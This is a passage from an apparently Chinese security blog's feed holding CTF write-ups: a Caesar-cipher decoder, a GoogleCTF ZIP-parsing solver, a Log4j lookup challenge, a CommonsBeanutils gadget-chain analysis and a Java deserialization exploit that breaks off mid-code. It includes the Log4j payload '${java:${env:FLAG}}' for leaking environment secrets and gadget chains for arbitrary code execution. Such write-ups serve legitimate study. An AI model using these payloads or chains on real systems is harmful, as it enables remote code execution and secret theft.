class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">,</span> <span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'!'</span><span class="token punctuation">,</span> <span class="token string">'!'</span><span class="token punctuation">,</span> <span class="token string">'}'</span><span class="token punctuation">]</span>    flag<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    table<span class="token operator">=</span>list<span class="token punctuation">(</span>ascii_lowercase<span class="token punctuation">)</span>    table<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'u'</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'v'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'j'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'z'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'f'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> key <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">for</span> i <span class="token keyword">in</span> text<span class="token punctuation">:</span>            <span class="token keyword">if</span> i <span class="token keyword">in</span> table<span class="token punctuation">:</span>                flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span>table<span class="token punctuation">[</span><span class="token punctuation">(</span>table<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span>key<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>        flag<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ctfshow{th1s_is_d1ffrent_c4esar!!}</p><h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="你newbee吗"><a href="#你newbee吗" class="headerlink" title="你newbee吗"></a>你newbee吗</h4><p>拖到IDA。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoogleCTF 2022</title>
      <link href="/2022/07/12/google-ctf-2022/"/>
      <url>/2022/07/12/google-ctf-2022/</url>
      
        <content type="html"><![CDATA[<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="Appnote-txt"><a href="#Appnote-txt" class="headerlink" title="Appnote.txt"></a>Appnote.txt</h4><blockquote><p>Every single archive manager unpacks this to a different file.ZIP压缩包相关题目。</p></blockquote><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>首先给了一个dump.zip，解压之后发现hello.txt。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220705010030.png" width=500 height=350/><p>但压缩包有60K，应该不止一个txt，尝试foremost分离无果。因此使用010 editor查看文件结构。会看到藏了很多以504B开头为标志的压缩包。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220705011231.png" width=600 height=400/><p>并且会看到ZIP的数据区(倒数第五行)显示flag00，翻到结尾是flag18，这里猜测flag有19位。并且发现在每个flagxx后给了单个字符，很显然flag是根据位数一个个拼接得到的，但是我们可以看到很多压缩包都对应flag00，flag00后又有不同的字符，因此猜测：</p><p>​<strong>如果flag{n}{x}对应正确的压缩包，那么x就是FLAG的第n位</strong></p><p>问题就转化为如何判断真的压缩包，通过查阅资料可知，zip格式压缩包主要由三大部分组成：数据区(0x04034b50)、中央目录记录区(0x02014b50)、中央目录记录尾部区(0x06054b50)。可以发现假的压缩包是没有</p><p>中央目录记录尾部区的，因此全局搜索504B0506。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220705014056.png"></p><p>有21个结果，第一个是hello.txt，第二个是hi.txt，剩下19个是真的压缩包flag{n}，中央目录记录尾部区主要作用是用来定位中央目录记录区的开始位置的。因此写脚本判断出尾部，再根据尾部区域对应的中央目录记录区的起始偏移找到第flagxx后的字符即可得到FLAG。</p><blockquote><pre class="line-numbers language-fallback"><code class="language-fallback"> 中央目录记录尾部区结构: 中央目录记录尾部开头标记    4 bytes  (0x06054b50) 中央目录记录尾部区所在磁盘编号             2 bytes 中央目录开始位置所在的磁盘编号  2 bytes 该磁盘上所记录的核心目录数量  2 bytes zip压缩包中的文件总数           2 bytes 整个中央目录的大小（以字节为单位）   4 bytes 中央目录开始位置相对位移        4 bytes 注释内容的长度        2 bytes 注释内容       (variable size)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p>找到开头标记后，当前位置+16(因为中央目录开始位置相对位移的相对位置在16~20)，找到中央目录开始位置的offset，再-1即可找到字符(因为中央目录开始位置的偏移的前一个字符就是数据区中的数据)。</p><h5 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h5><p><code>exp</code></p><pre class="line-numbers language-python"><code class="language-python">a <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"dump.zip"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> b<span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">if</span> a<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">==</span>b<span class="token string">"PK\x05\x06"</span><span class="token punctuation">:</span>    offset <span class="token operator">=</span> int<span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">0x14</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"little"</span><span class="token punctuation">)</span>       <span class="token operator">//</span><span class="token number">0x10</span>对应<span class="token operator">+</span><span class="token number">16</span>    flag <span class="token operator">+=</span> a<span class="token punctuation">[</span>offset<span class="token number">-1</span><span class="token punctuation">:</span>offset<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>CTF{p0s7m0d3rn_z1p}</p><hr><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="LOG4J"><a href="#LOG4J" class="headerlink" title="LOG4J"></a>LOG4J</h4><blockquote><p>具体原理还是没有完全理解，先记录一下解题过程。</p></blockquote><h5 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h5><p>访问靶机，会发现只有一个chatbot，随便输入点击submit后提示需要以&#x2F;为前缀，题目给了源码，直接看代码分析。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220705145853.png" width=500 height=200/><p>打开源码可以看到使用flask写的路由，这里贴附关键代码。可以看到和chatbot交互实际上是通过运行jar来进行的，省略的部分就是以空格分割出cmd以及text。比如输入：love you。此时cmd为love，text为you，然后返回标准输出。这里的cmd比较可疑，我们接着审计java部分。</p><pre class="line-numbers language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        text <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'text'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>        cmd <span class="token operator">=</span> <span class="token string">''</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        result <span class="token operator">=</span> chat<span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> text<span class="token punctuation">)</span>        <span class="token keyword">return</span> result    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">chat</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># run java jar with a 10 second timeout</span>    res <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'java'</span><span class="token punctuation">,</span> <span class="token string">'-jar'</span><span class="token punctuation">,</span> <span class="token string">'-Dcmd='</span> <span class="token operator">+</span> cmd<span class="token punctuation">,</span> <span class="token string">'chatbot/target/app-1.0-SNAPSHOT.jar'</span><span class="token punctuation">,</span> <span class="token string">'--'</span><span class="token punctuation">,</span> text<span class="token punctuation">]</span><span class="token punctuation">,</span> capture_output<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>java部分代码审下来大概就是这些功能：</p><ul><li>输入help或者&#x2F;help，返回提示：Try some of our free commands below!  wc time repeat.</li><li>输入&#x2F;wc,返回0，输入&#x2F;wc {str}，返回str的长度。</li><li>输入&#x2F;time，返回时间。</li><li>输入&#x2F;repeat，返回空，输入&#x2F;repeat {str}，返回str。</li></ul><p>这里还是没啥头绪，因为这题是LOG4J，因此翻一下xml配置文件，发现了可疑点。PatternLayout是log4j用于指定输出格式的的一个参数，那么可以看到它是通过EL表达式${}的形式进行了命令执行。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220705151856.png"></p><p>这里的cmd是我们可控的，又由于代码给出了flag变量，并且是从环境变量中提取的。</p><pre class="line-numbers language-java"><code class="language-java">String flag <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>尝试一下${flag},没用。但是通过测试，输入${java:flag}发现了有趣的事，抛出了异常信息。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220705152609.png" width=850 height=320/><p>经过搜索发现EL表达式可以获取环境变量:${env:xxx}，那么尝试用${java:${env:FLAG}}直接从环境变量取出flag。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220705153104.png"></p><p>CTF{d95528534d14dc6eb6aeb81c994ce8bd}</p><p>这里我不知道为什么输入${java:xxx}就显示Exception，而${flag}这样的形式就不会输出Exception。希望看到的师傅们能给出解答，跪谢。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsBeanutils利用链分析</title>
      <link href="/2022/01/06/commonsbeanutils-li-yong-lian-fen-xi/"/>
      <url>/2022/01/06/commonsbeanutils-li-yong-lian-fen-xi/</url>
      
        <content type="html"><![CDATA[<h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>commons-beanutils是用来操作JavaBean的工具。其中有一个方法可以调用任意类的getter方法。</p><pre class="line-numbers language-java"><code class="language-java">PropertyUtils<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span> o1<span class="token punctuation">,</span> property <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>TempatesImpl#getOutputProperties方法触发了newTransformer方法，因此我们需要找谁能调用getOutputProperties方法。但实际上只有Process这个无法序列化的类调用了getOutputProperties。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220909201618913.png" alt="image-20220909201618913"></p><p>这条链的巧妙就在于利用CB能操纵JavaBean的功能，如果getProperty的两个参数都可控，即调用getOutputProperties</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220909201444286.png" alt="image-20220909201444286"></p><p>compare就很熟悉了，经典的CC2，于是我们就通过PriorityQueue连通了链子。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220909202216854.png" alt="image-20220909202216854"></p><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>触发PriorityQueue反序列化，CC2的一系列流程走到PriorityQueue#siftDownUsingComparator进而触发BeanComparator#compare。</p><p>注：为什么不是在上面的if语句调用BeanComparator#compare？因为right&#x3D;2&#x3D;size,因此第一个条件不满足，直接跳过该if语句。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220909194436694.png" alt="image-20220909194436694"></p><p>进入BeanComparator#compare，PropertyUtils#getProperty方法自动调用JavaBean的getter方法，property被赋值为OutputProperties，因此调用TemplatesImpl#getOutputProperties方法。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220909194924113.png" alt="image-20220909194924113"></p><p>接下来调用newTransformer方法，就是标准的TemplatesImpl加载字节码任意代码执行的操作了。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220909195557290.png" alt="image-20220909195557290"></p><h4 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h4><pre class="line-numbers language-java"><code class="language-java">PriorityQueue#readObjectBeanComparator#compareTemplatesImpl#getOutputPropertiesTemplatesImpl#newTransformerdefineClassnewInstance<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gadget </tag>
            
            <tag> Java安全 </tag>
            
            <tag> CB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>东华杯 Ezgadget</title>
      <link href="/2021/12/31/dong-hua-bei-ezgadget/"/>
      <url>/2021/12/31/dong-hua-bei-ezgadget/</url>
      
        <content type="html"><![CDATA[<h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>题目给的是一个jar包，运行也没啥东西。直接用IDEA反编译jar包。</p><p>项目目录如下图所示：</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220901084000488.png" alt="image-20220901084000488"></p><p>为了方便写exp，我照着这个结构构建了项目，如果只是写exp的话只需把Tools和ToStringBean贴到项目里即可。如果要debug，则用maven构建项目把pom.xml复制过来；完全按照反编译结构构建项目即可。</p><h4 id="审计分析"><a href="#审计分析" class="headerlink" title="审计分析"></a>审计分析</h4><p>先从Controller入手</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"/readobject"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> String <span class="token function">unser</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"data"</span><span class="token punctuation">,</span>required <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span> String data<span class="token punctuation">,</span> Model model<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> Tools<span class="token punctuation">.</span><span class="token function">base64Decode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        InputStream inputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        String name <span class="token operator">=</span> objectInputStream<span class="token punctuation">.</span><span class="token function">readUTF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> year <span class="token operator">=</span> objectInputStream<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"gadgets"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> year <span class="token operator">==</span> <span class="token number">2021</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token string">"welcome bro."</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>显然要从&#x2F;readobject路由入手，传入的data用bas64解码后进行反序列化，如果输出流写入字符串为gadgets且写入Int为2021，则执行反序列化。</p><p>整体反序列化流程了解完，接下来寻找危险函数。</p><p>很明显：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ToStringBean</span> <span class="token keyword">extends</span> <span class="token class-name">ClassLoader</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ClassByte<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">ToStringBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        ToStringBean toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">clazz</span> <span class="token operator">=</span> toStringBean<span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span>null<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>ClassByte<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>ClassByte<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        Object var3 <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            var3 <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InstantiationException</span> var5<span class="token punctuation">)</span> <span class="token punctuation">{</span>            var5<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalAccessException</span> var6<span class="token punctuation">)</span> <span class="token punctuation">{</span>            var6<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token string">"enjoy it."</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是标准的类加载并且调用了newInstance();实例化，因此只要把恶意代码写在静态代码块即可触发。</p><p>而该恶意函数为toString，这是一个很常见的方法，因此直接从readObject入手，在CC5中的反序列化入口类BadAttributeValueExpException正是触发了toString方法。</p><p>**注意:BadAttributeValueExpException源于jdk自带的rj.jar包中。 **</p><pre class="line-numbers language-java"><code class="language-java">Object valObj <span class="token operator">=</span> gf<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//...略</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> null                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Long</span>                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Integer</span>                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Float</span>                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Double</span>                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Byte</span>                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Short</span>                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Boolean</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            val <span class="token operator">=</span> valObj<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// the serialized object is from a version without JDK-8019292 fix</span>            val <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">identityHashCode</span><span class="token punctuation">(</span>valObj<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"@"</span> <span class="token operator">+</span> valObj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有设置安全管理器，System.getSecurityManager() &#x3D;&#x3D; null，而valObj源自于val，该值需要通过反射修改为ToStringBean toStringbean即可触发toString。</p><p>注意序列化后的字符串用Tools的base64编码。</p><p>由于base64编码后的字符串存在+号，因此需要url编码一层。</p><p>gadget:</p><pre class="line-numbers language-java"><code class="language-java">BadAttributeValueExpException#readObjectToStringBean#toStringdefineClassnewInstance<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>ezgame<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>tools<span class="token punctuation">.</span>ToStringBean<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>AbstractTranslet<span class="token punctuation">;</span><span class="token keyword">import</span> javassist<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>BadAttributeValueExpException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ByteArrayOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token keyword">static</span> com<span class="token punctuation">.</span>ezgame<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>tools<span class="token punctuation">.</span>Tools<span class="token punctuation">.</span>base64Encode<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Payload</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> NoSuchFieldException<span class="token punctuation">,</span> CannotCompileException<span class="token punctuation">,</span> NotFoundException<span class="token punctuation">,</span> IOException<span class="token punctuation">,</span> IllegalAccessException <span class="token punctuation">{</span>        ClassPool pool <span class="token operator">=</span> ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        pool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 